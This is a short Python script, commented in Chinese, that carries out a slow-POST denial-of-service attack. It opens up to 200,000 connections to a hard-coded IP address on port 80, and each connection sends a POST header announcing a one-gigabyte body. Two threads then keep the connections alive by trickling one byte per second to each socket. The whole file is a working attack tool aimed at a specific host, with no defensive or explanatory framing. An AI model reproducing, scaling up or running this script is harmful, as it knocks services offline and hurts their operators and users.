"""
单线程跑的脚本
可以加入多进程或者多线程的方式优化，后续优化
"""
import socket
import time
import threading
MAX_CONN = 200000
PORT = 80
HOST = "111.229.128.32"
PAGE = "/"
buf = ("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 1000000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE, HOST))
socks = []


def conn_thread(HOST, PORT, buf):
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode('utf-8'))
            print("[+] Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(2)


def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode('utf-8'))
                print("[+] send OK! %s" % s)
            except Exception as ex:
                print("[-] send Exception:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)


conn_th = threading.Thread(target=conn_thread, args=(HOST, PORT, buf, ))
send_th = threading.Thread(target=send_thread, args=())
conn_th.start()
send_th.start()